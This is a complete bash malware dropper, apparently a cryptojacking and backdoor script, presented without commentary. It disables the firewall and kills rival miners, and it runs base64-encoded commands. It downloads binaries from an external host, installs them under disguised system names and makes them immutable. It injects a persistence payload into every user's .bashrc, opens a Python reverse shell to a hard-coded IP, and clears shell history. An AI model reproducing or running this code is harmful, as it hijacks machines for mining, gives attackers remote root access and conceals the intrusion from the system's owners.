#!/bin/bash
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SOURCE_URL="http://kaiserfranz.cc/meoow"
export BASHRCLOCK='dHJhcCAnJyAyCn4vLm1lb3cubHVsCnRyYXAgMgo='
export LOCKSCREEN=''


if [ -f "/etc/.meow" ]; then SSTATUS=`cat /etc/.meow`
if [ "$SSTATUS" = "Sdone" ]; then echo 'no dual install' ; exit ; fi
fi

iptables -F
chattr -ia /etc/ /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf | grep 'nameserver 8.8.8.8' 2>/dev/null || echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
cat /etc/resolv.conf | grep 'nameserver 8.8.4.4' 2>/dev/null || echo 'nameserver 8.8.4.4' >> /etc/resolv.conf
chattr +i /etc/resolv.conf 2>/dev/null

chattr -ia /etc/ 2>/dev/null
echo 'Sinstall' > /etc/.meow

function DLOAD(){
GET=$1
PUT=$2
mcurl -s -Lk $GET -o $PUT || mwget -q $GET -O $PUT || mwget -q --no-check-certificate $GET -O $PUT || curl -s -Lk $GET -o $PUT || wget -q $GET -O $PUT || wget -q --no-check-certificate $GET -O $PUT || curl2 -s -Lk $GET -o $PUT || wget2 -q $GET -O $PUT || wget2 -q --no-check-certificate $GET -O $PUT || cur -s -Lk $GET -o $PUT || wge -q $GET -O $PUT || wge -q --no-check-certificate $GET -O $PUT || cdl -s -Lk $GET -o $PUT || wdl -q $GET -O $PUT || wdl -q --no-check-certificate $GET -O $PUT
}

function CLEANUP(){
# mietz mietz clean up
if [ -f "/etc/ld.so.preload" ]; then chattr -ia /etc/ld.so.preload ; mv /etc/ld.so.preload /etc/ld.so.preload.bak ; fi
kill $(ps aux | grep -v grep | awk '{if($3>60.0) print $2}')
# zusammengew√ºrfelt mit absicht ihr nablos! :P
echo  | base64 -d | bash 2>/dev/null
# spezi jupyter cleanup
echo aWYgWyAtZSAvdG1wLy5veWFob2UvIF07IHRoZW4gY2hhdHRyIC1SIC1pYSAvdG1wLy5veWFob2UvIDsgcm0gLWZyIC90bXAvLm95YWhvZS8gOyBmaSAyPi9kZXYvbnVsbAppZiBbIC1lIC90bXAvLnN5cy8gXTsgdGhlbiBjaGF0dHIgLVIgLWlhIC90bXAvLnN5cy8gOyBybSAtZnIgL3RtcC8uc3lzIDsgZmkgMj4vZGV2L251bGwgCmlmIFsgLWUgL3Jvb3QveG1yaWcqLyBdOyB0aGVuIGNoYXR0ciAtUiAtaWEgL3Jvb3QveG1yaWcqLyA7IHJtIC1mciAvcm9vdC94bXJpZyovIDsgZmkgMj4vZGV2L251bGwK | base64 -d | bash 2>/dev/null
kill $(ps aux | grep -v grep | awk '{if($3>60.0) print $2}')
}

function SYSTEM_LOCKDOWN(){
chattr -ia ~/ /tmp/ /var/ /var/tmp/ 2>/dev/null ; tntrecht -ia ~/ /tmp/ /var/ /var/tmp/ 2>/dev/null

if [ ! -f "~/.meow.lul" ]; then
chattr -ia ~/
echo $LOCKSCREEN | base64 -d > ~/.meow.lul
chmod +x  ~/.meow.lul
chattr +i ~/.meow.lul
fi

chattr -ia ~/.bashrc
cat ~/.bashrc | grep '~/.meow.lul' 2>/dev/null || echo $BASHRCLOCK | base64 -d >> ~/.bashrc

if [ -f "/tmp/.meow.u" ]; then chattr -ia /tmp/ /tmp/.meow.u ; rm -f /tmp/.meow.u ; fi
ls -1 /home/ >> /tmp/.meow.u
while read USERN; do
if [ ! -f /home/$USERN/.meow.lul ]; then 
echo $LOCKSCREEN | base64 -d > /home/$USERN/.meow.lul
chmod +x /home/$USERN/.meow.lul
chattr +i /home/$USERN/.meow.lul
fi
cat /home/$USERN/.bashrc | grep '~/.meow.lul' || chattr -ia /home/$USERN/.bashrc ; echo $BASHRCLOCK | base64 -d >> /home/$USERN/.bashrc ; chattr +i /home/$USERN/.bashrc
done < /tmp/.meow.u
rm -f /tmp/.meow.u

if [ -f "/etc/bash.bashrc" ]; then
chattr -ia /etc/bash.bashrc
cat /etc/bash.bashrc | grep '~/.meow.lul' || echo $BASHRCLOCK | base64 -d >> /etc/bash.bashrc
chattr +i /etc/bash.bashrc 
fi


unset BASHRCLOCK
unset LOCKSCREEN
}

function XMR_BD_SETUP(){
chattr -ia /bin/ /usr/ /usr/bin/ 2>/dev/null
if [ -f "/bin/sbin" ]; then chattr -ia /bin/ /bin/sbin ; rm -f /bin/sbin ; fi
DLOAD $SOURCE_URL/bin/allin /bin/sbin
chmod +x /bin/sbin
/bin/sbin
chattr +i /bin/sbin

if [ -f "/usr/bin/kube" ]; then chattr -ia /usr/ /usr/bin/ /usr/bin/kube ; rm -f /usr/bin/kube ; fi
DLOAD $SOURCE_URL/bin/zigg /usr/bin/kube
chmod +x /usr/bin/kube
/usr/bin/kube
chattr +i /usr/bin/kube

if [ -f "/usr/bin/bioset" ]; then chattr -ia /usr/ /usr/bin/ /usr/bin/bioset ; rm -f /usr/bin/bioset ; fi
DLOAD $SOURCE_URL/bin/bioset /usr/bin/bioset
chmod +x /usr/bin/bioset
/usr/bin/bioset
chattr +i /usr/bin/bioset

if [ -f "/usr/bin/tshd" ]; then chattr -ia /usr/ /usr/bin/ /usr/bin/tshd ; rm -f /usr/bin/tshd ; fi
DLOAD $SOURCE_URL/bin/tshd /usr/bin/tshd
chmod +x /usr/bin/tshd
export HOME=/root
/usr/bin/tshd
chattr +i /usr/bin/tshd
}

CLEANUP
XMR_BD_SETUP
SYSTEM_LOCKDOWN

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("164.68.106.96",21051));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &

history -c 
clear
bash
